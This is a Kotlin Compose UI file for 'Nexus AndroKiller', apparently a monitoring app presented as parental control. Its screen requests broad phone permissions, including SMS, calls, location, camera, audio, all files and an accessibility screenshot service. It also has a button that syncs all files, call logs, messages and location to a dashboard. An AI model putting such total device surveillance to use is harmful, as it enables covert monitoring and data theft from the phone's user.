package com.nexus.androkiller.ui.main

import android.os.Build
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.ExperimentalLayoutApi
import androidx.compose.foundation.layout.FlowRow
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Edit
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material.icons.filled.Stop
import androidx.compose.material.icons.filled.Sync
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.ElevatedCard
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.lifecycle.viewmodel.compose.viewModel
import com.nexus.androkiller.tracker.PermissionManager

@OptIn(ExperimentalMaterial3Api::class, ExperimentalLayoutApi::class)
@Composable
fun MainScreen(
    modifier: Modifier = Modifier,
    viewModel: MainScreenViewModel = viewModel()
) {
    val context = LocalContext.current
    val uiState by viewModel.uiState.collectAsStateWithLifecycle()
    var showEditIdDialog by remember { mutableStateOf(false) }
    var tempDeviceId by remember { mutableStateOf("") }

    val permissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) {
        viewModel.refreshState(context)
    }

    LaunchedEffect(Unit) {
        viewModel.initialize(context)
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Box(
                            modifier = Modifier
                                .size(10.dp)
                                .background(
                                    color = if (uiState.isServiceRunning) Color(0xFF00E676) else Color(0xFFFFB300),
                                    shape = CircleShape
                                )
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Column {
                            Text("Nexus AndroKiller", fontWeight = FontWeight.Bold, fontSize = 18.sp)
                            Text(
                                text = if (uiState.isServiceRunning) "Foreground Service ACTIVE" else "Service IDLE / STANDBY",
                                fontSize = 11.sp,
                                color = if (uiState.isServiceRunning) Color(0xFF00E676) else Color(0xFFFFB300)
                            )
                        }
                    }
                },
                actions = {
                    IconButton(onClick = { viewModel.refreshState(context) }) {
                        Icon(Icons.Default.Refresh, contentDescription = "Refresh")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.surfaceVariant
                )
            )
        }
    ) { innerPadding ->
        LazyColumn(
            modifier = modifier
                .fillMaxSize()
                .padding(innerPadding)
                .padding(horizontal = 16.dp, vertical = 12.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // Header: Device Identifier Card
            item {
                ElevatedCard(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(16.dp)
                ) {
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(16.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Column {
                            Text("Child Device Identifier", style = MaterialTheme.typography.labelMedium)
                            Text(
                                text = uiState.deviceId.ifBlank { "Not Assigned" },
                                style = MaterialTheme.typography.titleMedium,
                                fontWeight = FontWeight.Bold,
                                fontFamily = FontFamily.Monospace,
                                color = Color(0xFF00E5FF)
                            )
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(
                                "Battery: ${uiState.batteryLevel}% • Storage: ${uiState.storageInfo.storagePercentUsed}% used",
                                fontSize = 11.sp,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )
                        }
                        IconButton(onClick = {
                            tempDeviceId = uiState.deviceId
                            showEditIdDialog = true
                        }) {
                            Icon(Icons.Default.Edit, contentDescription = "Edit Device ID")
                        }
                    }
                }
            }

            // ==========================================
            // PRIMARY BUTTON 1: Permissions & Autostart
            // ==========================================
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF1B2B28))
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(Icons.Default.Security, contentDescription = null, tint = Color(0xFF00E676))
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                "Step 1: Permissions & Autostart",
                                fontWeight = FontWeight.Bold,
                                fontSize = 16.sp,
                                color = Color.White
                            )
                        }

                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            "Grant permissions for background calls, location tracking, files, audio, camera, and allow MIUI/OEM autostart.",
                            fontSize = 12.sp,
                            color = Color(0xFFB0BEC5)
                        )

                        Spacer(modifier = Modifier.height(14.dp))

                        // Large Primary Permission Button
                        Button(
                            onClick = {
                                permissionLauncher.launch(PermissionManager.REQUIRED_RUNTIME_PERMISSIONS.toTypedArray())
                            },
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(50.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = Color(0xFF00C853),
                                contentColor = Color.White
                            )
                        ) {
                            Icon(Icons.Default.Security, contentDescription = null)
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Grant All Permissions", fontWeight = FontWeight.Bold, fontSize = 15.sp)
                        }

                        Spacer(modifier = Modifier.height(10.dp))

                        // Secondary OEM & System Settings Buttons
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            OutlinedButton(
                                onClick = { PermissionManager.requestIgnoreBatteryOptimizations(context) },
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(10.dp)
                            ) {
                                Text("Battery Saver Off", fontSize = 11.sp, maxLines = 1)
                            }
                            OutlinedButton(
                                onClick = { PermissionManager.openAllFilesAccessSettings(context) },
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(10.dp)
                            ) {
                                Text("All Files Access", fontSize = 11.sp, maxLines = 1)
                            }
                        }

                        Spacer(modifier = Modifier.height(6.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            OutlinedButton(
                                onClick = { PermissionManager.openAccessibilitySettings(context) },
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(10.dp)
                            ) {
                                Text("Screenshot Service", fontSize = 11.sp, maxLines = 1)
                            }
                            OutlinedButton(
                                onClick = { PermissionManager.openOverlaySettings(context) },
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(10.dp)
                            ) {
                                Text("Allow Overlay", fontSize = 11.sp, maxLines = 1)
                            }
                        }

                        Spacer(modifier = Modifier.height(6.dp))

                        OutlinedButton(
                            onClick = { PermissionManager.openAutostartSettings(context) },
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(10.dp)
                        ) {
                            Text("OEM Autostart Settings (MIUI / Vivo / Oppo)", fontSize = 11.sp, maxLines = 1)
                        }

                        Spacer(modifier = Modifier.height(12.dp))

                        // Live Permission Chips
                        FlowRow(
                            horizontalArrangement = Arrangement.spacedBy(6.dp),
                            verticalArrangement = Arrangement.spacedBy(6.dp)
                        ) {
                            PermissionBadge("📍 GPS", PermissionManager.hasLocationPermission(context))
                            PermissionBadge("📱 Screenshot", PermissionManager.isAccessibilityServiceEnabled(context))
                            PermissionBadge("🔋 Battery Kept", PermissionManager.isIgnoringBatteryOptimizations(context))
                            PermissionBadge("📁 All Files", PermissionManager.hasAllFilesAccess(context))
                            PermissionBadge("📞 Calls", PermissionManager.hasCallPermission(context))
                            PermissionBadge("💬 SMS", PermissionManager.hasSmsPermission(context))
                            PermissionBadge("📷 Camera", PermissionManager.hasCameraPermission(context))
                            PermissionBadge("🎤 Audio", PermissionManager.hasAudioPermission(context))
                            PermissionBadge("🚀 Overlay", PermissionManager.hasOverlayPermission(context))
                        }
                    }
                }
            }

            // ==========================================
            // PRIMARY BUTTON 2: Sync Everything & Start Service
            // ==========================================
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(containerColor = Color(0xFF132238))
                ) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(Icons.Default.Sync, contentDescription = null, tint = Color(0xFF00E5FF))
                            Spacer(modifier = Modifier.width(8.dp))
                            Text(
                                "Step 2: Sync Everything & Activate",
                                fontWeight = FontWeight.Bold,
                                fontSize = 16.sp,
                                color = Color.White
                            )
                        }

                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            "One tap synchronizes all phone files, call logs, SMS messages, live coordinates, and activates the background service.",
                            fontSize = 12.sp,
                            color = Color(0xFF90CAF9)
                        )

                        Spacer(modifier = Modifier.height(14.dp))

                        // Large Sync Everything & Start Service Button
                        Button(
                            onClick = {
                                viewModel.syncEverything(context)
                            },
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(52.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = Color(0xFF00B0FF),
                                contentColor = Color.Black
                            )
                        ) {
                            Icon(Icons.Default.PlayArrow, contentDescription = null)
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Sync Everything & Start Service", fontWeight = FontWeight.ExtraBold, fontSize = 15.sp)
                        }

                        if (uiState.isServiceRunning) {
                            Spacer(modifier = Modifier.height(10.dp))
                            OutlinedButton(
                                onClick = { viewModel.stopTrackingService(context) },
                                modifier = Modifier.fillMaxWidth(),
                                shape = RoundedCornerShape(10.dp),
                                colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFFFF5252))
                            ) {
                                Icon(Icons.Default.Stop, contentDescription = null, modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("Stop Foreground Service", fontSize = 12.sp)
                            }
                        }
                    }
                }
            }

            // Live Status Card
            item {
                Surface(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(14.dp),
                    color = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Text("Live Activity Status", fontWeight = FontWeight.SemiBold, fontSize = 12.sp)
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = uiState.statusMessage,
                            style = MaterialTheme.typography.bodyMedium,
                            fontWeight = FontWeight.Medium,
                            color = Color(0xFF00E5FF)
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            "Web Dashboard: http://localhost:5173",
                            fontSize = 11.sp,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                    }
                }
            }
        }
    }

    if (showEditIdDialog) {
        AlertDialog(
            onDismissRequest = { showEditIdDialog = false },
            title = { Text("Edit Device Identifier") },
            text = {
                OutlinedTextField(
                    value = tempDeviceId,
                    onValueChange = { tempDeviceId = it },
                    label = { Text("Device ID") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth()
                )
            },
            confirmButton = {
                Button(onClick = {
                    if (tempDeviceId.isNotBlank()) {
                        viewModel.updateDeviceId(context, tempDeviceId.trim())
                    }
                    showEditIdDialog = false
                }) {
                    Text("Save")
                }
            },
            dismissButton = {
                TextButton(onClick = { showEditIdDialog = false }) {
                    Text("Cancel")
                }
            }
        )
    }
}

@Composable
private fun PermissionBadge(label: String, granted: Boolean) {
    Surface(
        shape = RoundedCornerShape(8.dp),
        color = if (granted) Color(0xFF1B5E20) else Color(0xFF37474F)
    ) {
        Row(
            modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(
                if (granted) Icons.Default.CheckCircle else Icons.Default.Warning,
                contentDescription = null,
                tint = if (granted) Color(0xFF69F0AE) else Color(0xFFFFAB91),
                modifier = Modifier.size(12.dp)
            )
            Spacer(modifier = Modifier.width(4.dp))
            Text(
                text = label,
                fontSize = 10.sp,
                fontWeight = FontWeight.SemiBold,
                color = if (granted) Color(0xFFE8F5E9) else Color(0xFFECEFF1)
            )
        }
    }
}
